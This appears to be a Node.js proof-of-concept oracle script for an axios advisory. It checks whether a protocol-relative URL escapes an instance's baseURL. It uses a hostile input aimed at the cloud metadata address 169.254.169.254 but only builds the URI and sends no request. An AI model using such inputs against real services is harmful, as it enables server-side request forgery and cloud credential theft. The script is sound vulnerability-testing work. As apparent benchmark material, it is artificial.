let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

(async () => {
  try {
    const axiosMod = require('axios');
    const axios = axiosMod && axiosMod.default ? axiosMod.default : axiosMod;

    if (!axios || typeof axios.create !== 'function') {
      throw new Error('axios_api_unavailable');
    }

    const marker = 'ghsa-8hc4-vh64-cxmj-' + Date.now() + '-' + Math.random().toString(16).slice(2);

    const instance = axios.create({
      baseURL: 'http://example.com'
    });

    const benignUri = instance.getUri({ url: '/safe-path' });
    if (benignUri !== 'http://example.com/safe-path') {
      throw new Error('benign_uri_unexpected:' + String(benignUri));
    }

    operation_completed = true;

    const maliciousUri = instance.getUri({ url: '//169.254.169.254/latest/meta-data' });

    const escapedBase = typeof maliciousUri === 'string' && /^https?:\/\/169\.254\.169\.254(?::\d+)?\//i.test(maliciousUri);
    exploit_succeeded = escapedBase;

    evidence = JSON.stringify({
      marker,
      benign_uri: benignUri,
      malicious_uri: maliciousUri,
      escaped_base: escapedBase
    });
  } catch (err) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'setup_or_benign_failed:' + (err && err.message ? err.message : String(err));
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
})();